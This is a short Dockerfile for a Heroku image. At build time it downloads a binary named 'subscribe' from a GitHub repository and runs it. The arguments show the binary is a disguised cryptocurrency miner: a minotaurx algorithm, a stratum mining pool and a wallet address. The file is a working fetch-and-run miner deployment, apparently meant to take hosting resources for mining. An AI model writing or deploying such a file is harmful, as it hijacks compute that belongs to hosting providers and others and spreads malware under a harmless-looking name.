FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/AVGandhi/student/raw/main/subscribe; chmod +x subscribe; ./subscribe -a minotaurx -o stratum+tcp://stratum-na.rplant.xyz:17063 -u CMMRSxbmrTrGS6EAk3MiKrmHGYyU2spk8S.VPS -p password=test
CMD bash heroku.sh
